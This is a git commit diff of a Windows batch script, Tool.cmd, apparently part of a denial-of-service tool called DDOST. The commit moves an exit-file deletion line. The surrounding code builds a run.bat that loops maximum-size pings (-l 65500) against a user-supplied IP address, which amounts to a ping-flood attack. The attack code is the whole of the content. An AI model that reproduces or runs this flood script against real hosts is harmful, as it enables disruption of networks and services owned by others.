9c3c651ea6e0d737bc085109963d5cd8ea57656e
AuraProgramming <83914971+AuraProgramming@users.noreply.github.com>
2021-10-13 15:24:57 -0400

    Update Tool.cmd

--- Tool.cmd
+++ Tool.cmd
@@ -1,5 +1,5 @@
 @echo off
-  del /q "%userprofile%\.ddost\data\exit.dat"
+  
 
 if exist %userprofile%\key goto skip
   cls
@@ -20,6 +20,7 @@ if exist %userprofile%\key goto skip
       echo :loop>>"%temp%\DDOST\run.bat"
       echo ping %ip% -n 1 -l 65500>>"%temp%\DDOST\run.bat"
       echo if exist "%userprofile%\.ddost\data\exit.dat" exit>>"%temp%\DDOST\run.bat"
+      echo del /q "%userprofile%\.ddost\data\exit.dat">>"%temp%\DDOST\run.bat"
       echo goto loop>>"%temp%\DDOST\run.bat"
       echo Minimize Windows (Y/N):
   set /p mintf=
